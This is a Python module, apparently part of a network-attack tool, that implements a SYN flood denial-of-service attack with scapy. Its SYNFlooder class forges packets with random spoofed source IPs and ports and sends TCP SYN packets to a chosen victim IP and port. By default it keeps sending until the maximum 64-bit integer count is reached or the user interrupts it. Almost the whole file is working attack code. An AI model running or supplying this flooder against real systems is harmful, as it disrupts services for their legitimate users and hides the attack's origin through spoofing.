#!/usr/bin/env python3
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 3 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# Written by:
#        Nadzeya Hutsko <nadzya.info@gmail.com>
"""The module for SYN flood class"""


import sys
import textwrap
import logging
from random import randint
from scapy.all import IP, TCP, send  # pylint: disable=E0401,E0611

from .helpers import (
    random_IP,
    random_port,
    validate_ip_address,
    validate_port,
    progress_bar,
)


_LOGGER = logging.getLogger(__name__)


class SYNFlooder:  # pylint: disable=R0903
    """A class that represents a SYN flood attack"""

    def __init__(self, dst_ip, dst_port, count):
        """
        Initialaze a SYN flood object

        :dst_ip: the victim's IP
        :dst_port: the victim's port
        """
        self.dst_ip = validate_ip_address(dst_ip)
        self.dst_port = validate_port(dst_port)
        if count is None:
            self.count = 9223372036854775807
        else:
            self.count = int(count)
        if dst_ip and dst_port and count:
            _LOGGER.debug(
                "Creating a SYNFlooder object with destination IP %s"
                " and destination port %i",
                self.dst_ip,
                self.dst_port,
            )
        self.description = textwrap.dedent(
            """\
            The SYN flood attack description:

            A SYN flood is a form of denial-of-service attack in which
            an attacker rapidly initiates a connection to a server without
            finalizing the connection. The server has to spend resources
            waiting for half-opened connections, which can consume enough
            resources to make the system unresponsive to legitimate traffic.

            Read more: https://www.wikiwand.com/en/SYN_flood
            """
        )

    def _create_ip_packet(self):
        """Create an IP packet with random source IP"""
        IP_Packet = IP()  # pylint: disable=C0103
        IP_Packet.src = random_IP()
        IP_Packet.dst = self.dst_ip
        return IP_Packet

    def _create_tcp_packet(self):
        """Create an IP packet with random source port"""
        TCP_Packet = TCP()  # pylint: disable=C0103
        TCP_Packet.sport = random_port()
        TCP_Packet.dport = self.dst_port
        TCP_Packet.flags = "S"
        TCP_Packet.seq = randint(1000, 9000)
        TCP_Packet.window = randint(1000, 9000)
        return TCP_Packet

    def run(self):
        """
        Run the SYN flood attack until KeyboardInterrupt
        or the number of all packets is sent
        """
        total = 0
        _LOGGER.warning(
            "Trying to send %i packets. Press Ctrl+C to "
            "stop before all the packets will be sent",
            self.count,
        )

        for x in range(0, self.count):  # pylint: disable=C0103
            try:
                # Ether_Frame = Ether()
                # Ether_Frame.scr = randomMAC()
                IP_Packet = self._create_ip_packet()  # pylint: disable=C0103
                TCP_Packet = self._create_tcp_packet()  # pylint: disable=C0103
                send(IP_Packet / TCP_Packet, verbose=0)
                progress_bar(x, self.count)
                total += 1
            except KeyboardInterrupt:
                _LOGGER.info("\nTotal packets sent: %i\n", total)
                _LOGGER.warning("\nStopping SYN flood attack")
                sys.exit(0)

        progress_bar(self.count, self.count)
        _LOGGER.warning("\nTotal packets sent: %i\n", total)
